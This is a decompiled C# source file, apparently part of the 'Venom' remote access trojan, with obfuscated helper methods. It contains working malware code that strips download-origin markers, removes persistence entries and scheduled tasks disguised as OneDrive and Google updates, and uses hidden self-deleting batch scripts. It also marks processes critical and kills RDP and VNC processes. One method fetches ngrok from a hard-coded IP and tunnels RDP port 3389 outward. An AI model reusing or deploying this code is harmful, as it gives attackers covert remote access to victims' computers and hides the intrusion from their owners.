using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using VenomC.Chaos.Utilities;

public static class GClass47
{
	private const string string_0 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

	private static readonly Random random_0 = new Random(Environment.TickCount);

	private const int int_0 = 1024;

	public static string smethod_0(int length, string extension = "")
	{
		StringBuilder stringBuilder = new StringBuilder(length);
		for (int i = 0; i < length; i++)
		{
			stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[random_0.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
		}
		return stringBuilder.ToString() + extension;
	}

	public static string smethod_1(string extension)
	{
		string text;
		do
		{
			text = Path.Combine(Path.GetTempPath(), smethod_0(12, extension));
		}
		while (File.Exists(text));
		return text;
	}

	public static bool smethod_2(byte[] block)
	{
		if (block.Length < 2)
		{
			return false;
		}
		if (block[0] == 77 && block[1] == 90)
		{
			return true;
		}
		if (block[0] == 90)
		{
			return block[1] == 77;
		}
		return false;
	}

	public static bool smethod_3(string filePath)
	{
		return GClass8.DeleteFile(filePath + ":Zone.Identifier");
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool PostMessage(IntPtr hWnd, [MarshalAs(UnmanagedType.U4)] uint Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	public static void smethod_4()
	{
		try
		{
			IntPtr hWnd = FindWindow("Shell_TrayWnd", null);
			Console.WriteLine("INIT PTR: {0}", hWnd.ToInt32());
			PostMessage(hWnd, 1460u, (IntPtr)0, (IntPtr)0);
			while (true)
			{
				hWnd = FindWindow("Shell_TrayWnd", null);
				Console.WriteLine("PTR: {0}", hWnd.ToInt32());
				if (hWnd.ToInt32() == 0)
				{
					break;
				}
				Thread.Sleep(1000);
			}
			Console.WriteLine("Success. Breaking out of loop.");
		}
		catch (Exception ex)
		{
			Console.WriteLine("{0} {1}", ex.Message, ex.StackTrace);
		}
		Console.WriteLine("Restarting the shell.");
		string fileName = string.Format("{0}\\{1}", Environment.GetEnvironmentVariable("WINDIR"), "explorer.exe");
		Process process = new Process();
		process.StartInfo.FileName = fileName;
		process.StartInfo.UseShellExecute = true;
		process.Start();
		Console.ReadLine();
	}

	public static void smethod_5()
	{
		Class46.smethod_0();
	}

	public static void smethod_6()
	{
		try
		{
			bool[] array = new bool[2] { true, false };
			foreach (bool flag in array)
			{
				using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, flag ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", writable: true);
				if ((registryKey.GetValue("AppInit_DLLs", "") as string).Contains("Venom"))
				{
					registryKey.SetValue("AppInit_DLLs", "");
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_7()
	{
	}

	public static void smethod_8()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("cmd");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("conhost");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("installrdp");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("rdpinstall");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("updaterdp");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("Install");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("winvnc");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public static void smethod_9()
	{
		try
		{
			smethod_8();
			Process[] processesByName = Process.GetProcessesByName("cmd");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("conhost");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("VenomInstall");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("Venom");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Venom.exe"));
			string userName = Environment.UserName;
			File.Delete("C:/Users/" + userName + "/Desktop/Venom.exe");
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
			Path.Combine(folderPath, "VenomCcleaner.lnk");
			Path.Combine(folderPath, "VenomFox.lnk");
			Path.Combine(folderPath, "VenomChrome.lnk");
			Path.Combine(folderPath, "VenomCcleaner.lnk");
			string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Venom.exe");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
			files = Directory.GetFiles(folderPath, "VenomFox.lnk");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
			files = Directory.GetFiles(folderPath, "VenomChrome.lnk");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
			files = Directory.GetFiles(folderPath, "VenomCcleaner.lnk");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
			files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "VenomInstall.exe");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
			files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Venom.exe");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
			files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Venom");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
			if (File.Exists(GClass69.InstallPath))
			{
				File.Delete(GClass69.InstallPath);
			}
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b powershell Unregister-ScheduledTask -TaskName \"Onedrive\" -Confirm:$false  & exit",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b powershell Unregister-ScheduledTask -TaskName \"GoogleUpdateTaskUserS-1-5-21-3349668628-324293029-2081181062-1001Core\" -Confirm:$false  & exit",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b powershell Unregister-ScheduledTask -TaskName \"OneDrive Standalone Update Task-S-1-5-21-6666668628-324293029-2081181062-1001\" -Confirm:$false  & exit",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b powershell Unregister-ScheduledTask -TaskName \"GoogleUpdateTaskUserS-1-5-21-3349668628-324293029-2081181062-1001Core\" -Confirm:$false  & exit",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
		}
		catch (Exception)
		{
		}
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

	public static void smethod_10()
	{
		try
		{
			RtlSetProcessIsCritical(0u, 0u, 0u);
		}
		catch
		{
			while (true)
			{
				Thread.Sleep(100000);
			}
		}
	}

	public static void smethod_11()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b del /q/f/s %TEMP%\\* & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static string smethod_12(bool isFileHidden)
	{
		try
		{
			string text = smethod_1(".bat");
			string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\ndel /a /q /f \"" + GClass69.CurrentPath + "\"\r\nrmdir /q /s \"" + Klover.LogDirectory + "\"\r\ndel /a /q /f \"" + text + "\"";
			File.WriteAllText(text, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
			return text;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static string smethod_13(string token)
	{
		try
		{
			string text = Path.Combine(Path.GetTempPath(), "ngrok.bat");
			string contents = "set downloadURL=http://91.134.207.16/update/ngrok.exe\r\nset logFile=%TEMP%\\proclog.txt\r\nset exeFile=%TEMP%\\ngrok.exe\r\nset logFile=%TEMP%\\proclog.txt\r\npowershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/update/ngrok.exe','%exeFile%');\r\n%exeFile% authtoken " + token + " \r\n%exeFile%  tcp  3389 > %logFile% \"" + text + "\"";
			File.WriteAllText(text, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b powershell -noexit -executionpolicy bypass -File " + text + " ",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
			return text;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static string smethod_14(string newFilePath, bool isFileHidden)
	{
		try
		{
			string text = smethod_1(".bat");
			string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\ndel /a /q /f \"" + GClass69.CurrentPath + "\"\r\nmove /y \"" + newFilePath + "\" \"" + GClass69.CurrentPath + "\"\r\nstart \"\" \"" + GClass69.CurrentPath + "\"\r\ndel /a /q /f \"" + text + "\"";
			File.WriteAllText(text, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
			return text;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static string smethod_15()
	{
		try
		{
			string text = smethod_1(".bat");
			string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\nstart \"\" \"" + GClass69.CurrentPath + "\"\r\ndel /a /q /f \"" + text + "\"";
			File.WriteAllText(text, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
			return text;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static void smethod_16(string filename, string appendText)
	{
		appendText = smethod_17(filename) + appendText;
		using FileStream fileStream = File.Open(filename, FileMode.Create, FileAccess.Write);
		byte[] array = GClass73.smethod_4(Encoding.UTF8.GetBytes(appendText));
		fileStream.Seek(0L, SeekOrigin.Begin);
		fileStream.Write(array, 0, array.Length);
	}

	public static string smethod_17(string filename)
	{
		if (!File.Exists(filename))
		{
			return string.Empty;
		}
		return Encoding.UTF8.GetString(GClass73.smethod_7(File.ReadAllBytes(filename)));
	}
}
